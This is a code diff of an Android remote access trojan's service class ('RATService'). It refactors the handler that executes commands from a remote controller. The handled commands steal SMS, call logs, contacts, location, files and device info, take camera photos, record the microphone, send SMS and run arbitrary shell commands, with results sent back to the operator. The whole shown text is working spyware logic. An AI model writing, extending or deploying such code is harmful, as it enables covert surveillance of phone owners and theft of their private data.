@@ -372,219 +372,154 @@ public class RATService extends Service {
             out.flush();
         }
     }
-    
     private void processCommand(String command) {
-        String[] parts = command.split("\\|", 2);
-        String cmd = parts[0];
-        String args = parts.length > 1 ? parts[1] : "";
-        
-        Log.d(TAG, "Received command: " + cmd);
-        
-        switch (cmd) {
-            case "PING":
-                sendCommand("PONG");
-                break;
-                
-            case "info":
-            case "INFO":
-                if (deviceModule != null) {
-                    String result = deviceModule.getDeviceInfo();
-                    sendCommand("INFO|" + result);
-                } else {
-                    sendCommand("INFO|ERROR: Device module not available");
-                }
-                break;
-                
-            case "location":
-            case "LOCATION":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                } else {
-                    sendCommand("LOCATION|ERROR: Location module not available");
-                }
-                break;
-                
-            case "camera":
-            case "CAMERA":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA|" + result);
-                } else {
-                    sendCommand("CAMERA|ERROR: Camera module not available");
-                }
-                break;
-                
-            case "sms":
-            case "SMS":
-                if (smsModule != null) {
-                    String result = smsModule.getSms();
-                    sendCommand("SMS|" + result);
-                } else {
-                    sendCommand("SMS|ERROR: SMS module not available");
-                }
-                break;
-                
-            case "calls":
-            case "CALLS":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALLS|" + result);
-                } else {
-                    sendCommand("CALLS|ERROR: Calls module not available");
-                }
-                break;
-                
-            case "contacts":
-            case "CONTACTS":
-                if (contactsModule != null) {
-                    String result = contactsModule.getContacts();
-                    sendCommand("CONTACTS|" + result);
-                } else {
-                    sendCommand("CONTACTS|ERROR: Contacts module not available");
-                }
-                break;
-                
-            case "files":
-            case "FILES":
-                if (fileModule != null) {
-                    String path = args.isEmpty() ? "/sdcard" : args;
-                    String result = fileModule.listFiles(path);
-                    sendCommand("FILES|" + result);
-                } else {
-                    sendCommand("FILES|ERROR: File module not available");
-                }
-                break;
-                
-            case "mic":
-            case "MIC":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC|" + result);
-                } else {
-                    sendCommand("MIC|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "help":
-            case "HELP":
-                sendCommand("HELP|Available commands: info, location, camera, sms, calls, contacts, files, mic, shell, ping");
-                break;
-                
-            case "CAMERA_PHOTO":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA_PHOTO|" + result);
-                } else {
-                    sendCommand("CAMERA_PHOTO|ERROR: Camera module not available");
-                }
-                break;
-                
-            case "MIC_START":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC_START|" + result);
-                } else {
-                    sendCommand("MIC_START|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "MIC_STOP":
-                if (micModule != null) {
-                    String result = micModule.stopRecording();
-                    sendCommand("MIC_STOP|" + result);
-                } else {
-                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "LOCATION":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                } else {
-                    sendCommand("LOCATION|ERROR: Location module not available");
-                }
-                break;
-                
-            case "SMS_GET":
-                if (smsModule != null) {
-                    String result = smsModule.getSms();
-                    sendCommand("SMS_GET|" + result);
-                } else {
-                    sendCommand("SMS_GET|ERROR: SMS module not available");
-                }
-                break;
-                
-            case "SMS_SEND":
-                if (smsModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = smsModule.sendSms(parts2[0], parts2[1]);
-                    sendCommand("SMS_SEND|" + result);
-                } else {
-                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "CALL_GET":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALL_GET|" + result);
-                } else {
-                    sendCommand("CALL_GET|ERROR: Calls module not available");
-                }
-                break;
-                
-            case "CONTACTS_GET":
-                if (contactsModule != null) {
-                    String result = contactsModule.getContacts();
-                    sendCommand("CONTACTS_GET|" + result);
-                } else {
-                    sendCommand("CONTACTS_GET|ERROR: Contacts module not available");
-                }
-                break;
-                
-            case "FILE_LIST":
-                if (fileModule != null) {
-                    String result = fileModule.listFiles(args);
-                    sendCommand("FILE_LIST|" + result);
-                } else {
-                    sendCommand("FILE_LIST|ERROR: File module not available");
-                }
-                break;
-                
-            case "FILE_GET":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                } else {
-                    sendCommand("FILE_GET|ERROR: File module not available");
-                }
-                break;
-                
-            case "SHELL":
-                if (shellModule != null) {
-                    String result = shellModule.executeCommand(args);
-                    sendCommand("SHELL|" + result);
-                } else {
-                    sendCommand("SHELL|ERROR: Shell module not available");
-                }
-                break;
-                
-            case "DEVICE_INFO":
-                if (deviceModule != null) {
-                    String result = deviceModule.getDeviceInfo();
-                    sendCommand("DEVICE_INFO|" + result);
-                } else {
-                    sendCommand("DEVICE_INFO|ERROR: Device module not available");
-                }
-                break;
-                
-            default:
-                sendCommand("UNKNOWN_CMD|" + cmd);
-                break;
-        }
+    String[] parts = command.split("\\|", 2);
+    String cmd = parts[0];
+    String args = parts.length > 1 ? parts[1] : "";
+    
+    Log.d(TAG, "Received command: " + cmd);
+    
+    switch (cmd) {
+        case "PING":
+            sendCommand("PONG");
+            break;
+            
+        case "info":
+        case "INFO":
+        case "DEVICE_INFO":
+            if (deviceModule != null) {
+                String result = deviceModule.getDeviceInfo();
+                sendCommand("INFO|" + result);
+            } else {
+                sendCommand("INFO|ERROR: Device module not available");
+            }
+            break;
+            
+        case "location":
+        case "LOCATION":
+            if (locationModule != null) {
+                String result = locationModule.getLocation();
+                sendCommand("LOCATION|" + result);
+            } else {
+                sendCommand("LOCATION|ERROR: Location module not available");
+            }
+            break;
+            
+        case "camera":
+        case "CAMERA":
+        case "CAMERA_PHOTO":
+            if (cameraModule != null) {
+                String result = cameraModule.takePhoto();
+                sendCommand("CAMERA|" + result);
+            } else {
+                sendCommand("CAMERA|ERROR: Camera module not available");
+            }
+            break;
+            
+        case "sms":
+        case "SMS":
+        case "SMS_GET":
+            if (smsModule != null) {
+                String result = smsModule.getSms();
+                sendCommand("SMS|" + result);
+            } else {
+                sendCommand("SMS|ERROR: SMS module not available");
+            }
+            break;
+            
+        case "calls":
+        case "CALLS":
+        case "CALL_GET":
+            if (callsModule != null) {
+                String result = callsModule.getCallLogs();
+                sendCommand("CALLS|" + result);
+            } else {
+                sendCommand("CALLS|ERROR: Calls module not available");
+            }
+            break;
+            
+        case "contacts":
+        case "CONTACTS":
+        case "CONTACTS_GET":
+            if (contactsModule != null) {
+                String result = contactsModule.getContacts();
+                sendCommand("CONTACTS|" + result);
+            } else {
+                sendCommand("CONTACTS|ERROR: Contacts module not available");
+            }
+            break;
+            
+        case "files":
+        case "FILES":
+        case "FILE_LIST":
+            if (fileModule != null) {
+                String path = args.isEmpty() ? "/sdcard" : args;
+                String result = fileModule.listFiles(path);
+                sendCommand("FILES|" + result);
+            } else {
+                sendCommand("FILES|ERROR: File module not available");
+            }
+            break;
+            
+        case "mic":
+        case "MIC":
+        case "MIC_START":
+            if (micModule != null) {
+                String result = micModule.startRecording(30);
+                sendCommand("MIC|" + result);
+            } else {
+                sendCommand("MIC|ERROR: Microphone module not available");
+            }
+            break;
+            
+        case "MIC_STOP":
+            if (micModule != null) {
+                String result = micModule.stopRecording();
+                sendCommand("MIC_STOP|" + result);
+            } else {
+                sendCommand("MIC_STOP|ERROR: Microphone module not available");
+            }
+            break;
+            
+        case "SMS_SEND":
+            if (smsModule != null && args.contains("|")) {
+                String[] parts2 = args.split("\\|", 2);
+                String result = smsModule.sendSms(parts2[0], parts2[1]);
+                sendCommand("SMS_SEND|" + result);
+            } else {
+                sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
+            }
+            break;
+            
+        case "FILE_GET":
+            if (fileModule != null) {
+                String result = fileModule.getFile(args);
+                sendCommand("FILE_GET|" + result);
+            } else {
+                sendCommand("FILE_GET|ERROR: File module not available");
+            }
+            break;
+            
+        case "SHELL":
+            if (shellModule != null) {
+                String result = shellModule.executeCommand(args);
+                sendCommand("SHELL|" + result);
+            } else {
+                sendCommand("SHELL|ERROR: Shell module not available");
+            }
+            break;
+            
+        case "help":
+        case "HELP":
+            sendCommand("HELP|Available commands: info, location, camera, sms, calls, contacts, files, mic, shell, ping");
+            break;
+            
+        default:
+            sendCommand("UNKNOWN_CMD|" + cmd);
+            break;
     }
+}
+   
     
     private String getUniqueDeviceId() {
         SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
